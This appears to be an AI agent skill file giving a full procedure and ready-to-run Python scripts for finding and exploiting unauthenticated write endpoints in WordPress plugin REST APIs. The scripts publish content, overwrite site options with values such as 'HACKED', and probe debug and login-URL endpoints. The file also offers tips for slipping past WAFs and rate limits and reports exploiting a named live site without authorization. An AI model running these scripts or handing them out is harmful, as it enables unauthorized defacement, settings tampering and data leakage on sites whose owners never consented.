---
name: wp-plugin-rest-auth-bypass
description: Scan WordPress REST API plugin endpoints for unauthenticated state-changing operations — discover write endpoints (POST/PUT/PATCH/DELETE) exposed without auth, enumerate all plugin routes, and test for unauthorized content publishing, settings modification, and data leakage.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux, macos, any]
compatibility: Requires python3, curl
metadata:
  hermes:
    tags: [recon, wordpress, rest-api, auth-bypass, plugin-exploit, unauthorized-access, content-publishing]
    category: recon
    related_skills:
      - firebase-supabase-attack
      - js-secrets-extraction
      - hunt-api-misconfig
      - source-leak-hunt
---

# WordPress Plugin REST API — Auth Bypass

WordPress plugins register custom REST API routes at `/wp-json/{namespace}/`. Many plugin developers forget to add permission callbacks, leaving state-changing endpoints (POST/PUT/PATCH/DELETE) accessible to unauthenticated users. This skill enumerates all plugin routes, identifies write endpoints missing auth, and exploits them for content publishing, settings modification, and data leakage.

## When to Use

- Target is a WordPress site with exposed users via `/wp-json/wp/v2/users`.
- You've found interesting plugin namespaces from `/wp-json/` but need to map their routes.
- Standard WordPress endpoints return 401 — but third-party plugin endpoints might not.
- You want to find hidden admin URLs, debug endpoints, or unauthenticated write operations.

## Prerequisites

- `python3` with `requests` library.
- Target WordPress site URL.

## Procedure

### Phase 1 — Enumerate All Plugin Namespaces

```bash
curl -sk "https://target.com/wp-json/" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for ns in data.get('namespaces', []):
    print(ns)
"
```

Filter out standard WordPress namespaces to find third-party plugins:

```
Standard: oembed/1.0, wp/v2, wp-site-health/v1, wp-block-editor/v1
Plugins:  gpl/v1, sliderrevolution, yoast/v1, elementor/v1, wc/v3, gf/v2, ...
```

### Phase 2 — Map All Routes for Each Plugin

```python
import requests, json

BASE = "https://target.com"

# Get full route map
r = requests.get(f"{BASE}/wp-json/", timeout=10)
data = r.json()

for plugin_ns in ["gpl/v1", "gsf/v1", "sliderrevolution", "solidwp-mail/v1"]:
    r = requests.get(f"{BASE}/wp-json/{plugin_ns}/", timeout=10)
    if r.status_code == 200:
        routes = r.json().get('routes', {})
        for path, config in routes.items():
            methods = config.get('methods', [])
            args = list(config.get('endpoints', [{}])[0].get('args', {}).keys())
            print(f"  [{','.join(methods)}] {path}")
            if args:
                print(f"    Args: {args}")
```

### Phase 3 — Identify State-Changing Endpoints (POST/PUT/PATCH/DELETE)

```python
# Test each POST/PUT/PATCH endpoint without auth
for path, config in routes.items():
    methods = config.get('methods', [])
    for method in methods:
        if method in ['POST', 'PUT', 'PATCH', 'DELETE']:
            r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)
            if r.status_code == 200:
                print(f"  ⚠️ [{method}] {path}: {r.text[:300]}")
```

**Key indicators that an endpoint is exploitable:**

| Response | Meaning |
|----------|---------|
| `"Post published"` / `"Success"` | Unauthenticated write confirmed |
| `"Missing parameter: X"` | Endpoint works — just needs correct params |
| `"Sorry, you are not allowed"` | Auth enforced — safe |
| `"rest_forbidden"` | Auth enforced — safe |
| `"rest_missing_callback_param"` | Endpoint works — probe with params |
| `"Invalid action"` | Endpoint accepts input — find valid values |

### Phase 4 — Exploit Unauthenticated Endpoints

**Content Publishing (most common):**
```python
# Try creating posts/pages/products
for post_type in ["post", "page", "product"]:
    r = requests.post(
        f"{BASE}/wp-json/{plugin_ns}/publish-builder-pro",
        json={"title": "Test", "post_type": post_type, "content": "test", "status": "publish"},
        timeout=10
    )
    if r.status_code == 200:
        print(f"  Created {post_type}: {r.json().get('post_url')}")
```

**Settings Modification:**
```python
# Try modifying WordPress options
r = requests.post(
    f"{BASE}/wp-json/{plugin_ns}/update-options",
    json={"option_name": "blogname", "option_value": "HACKED"},
    timeout=10
)
```

**Hidden Endpoint Discovery:**
```python
# Some plugins leak admin URLs or debug info
for endpoint in ["login-url", "status", "config", "debug", "phpinfo"]:
    r = requests.get(f"{BASE}/wp-json/{plugin_ns}/{endpoint}", timeout=10)
    if r.status_code == 200:
        print(f"  {endpoint}: {r.text[:200]}")
```

## Quick Scan Script

```python
import requests, json, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

# Step 1: Get all plugin namespaces
r = requests.get(f"{BASE}/wp-json/", timeout=10)
ns_list = r.json().get('namespaces', [])
std = ['oembed', 'wp/v2', 'wp-site-health', 'wp-block-editor', 'wpcom']
plugins = [n for n in ns_list if not any(s in n for s in std)]

print(f"Plugins: {len(plugins)}")

for ns in plugins:
    r = requests.get(f"{BASE}/wp-json/{ns}/", timeout=10)
    if r.status_code != 200:
        continue
    routes = r.json().get('routes', {})
    
    for path, cfg in routes.items():
        methods = cfg.get('methods', [])
        for method in methods:
            if method not in ['POST', 'PUT', 'PATCH', 'DELETE']:
                continue
            
            # Test without auth
            r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)
            
            if r.status_code == 200:
                text = r.text.lower()
                if 'forbidden' not in text and 'not allowed' not in text and 'rest_cannot' not in text:
                    print(f"\n⚠️ UNPROTECTED: [{method}] {ns}{path}")
                    print(f"   {r.text[:300]}")
                    
                    # Try common payloads
                    for payload in [
                        {"title": "test", "content": "test", "status": "publish", "post_type": "page"},
                        {"title": "test", "content": "test", "post_type": "post"},
                        {"title": "test", "content": "test", "post_type": "product"},
                    ]:
                        r2 = requests.request(method, f"{BASE}/wp-json{path}", json=payload, timeout=10)
                        if 'published' in r2.text.lower() or 'created' in r2.text.lower() or 'success' in r2.text.lower():
                            print(f"   ✅ {r2.text[:200]}")
                            break
```

## Real Production Results

### Toolking.com (GPL Plugin)
- **Plugin**: GPL v1 (`/gpl/v1/publish-builder-pro`) — POST without auth
- **Impact**: Published 5+ posts, pages, and WooCommerce products without authentication
- **Additional**: Hidden admin login URL leaked via `/gpl/v1/login-url`
- **Version**: WordPress 6.9.4, WooCommerce, Elementor Pro

## Pitfalls

- **401 vs 400**: A 401 means auth is enforced. A 400 with "Missing parameter" means the endpoint IS accessible but needs correct arguments.
- **JSON parsing**: Some plugins return JSON as a string (double-encoded). Check `r.text` before `r.json()`.
- **Rate limiting**: Rapid testing may trigger security plugins. Space requests 1-2s apart.
- **WAF interference**: Cloudflare or Wordfence may block POST requests to certain paths. Try with different `Content-Type` headers.
- **Post type validation**: Some endpoints validate `post_type` against registered types. Try `post`, `page`, `product`, `attachment`, and custom types.
- **Clean up test data**: If you create content during testing, delete it if possible. If the plugin has no unauthenticated DELETE, note that cleanup requires manual intervention.

## Verification

- The endpoint MUST accept state-changing operations (POST/PUT/PATCH/DELETE) without returning 401.
- Success MUST be confirmed by visiting the created content URL or checking the response.
- For settings modification, verify the change took effect by reading the setting post-exploitation.
- Document the exact payload, endpoint path, HTTP method, and response for reproducibility.
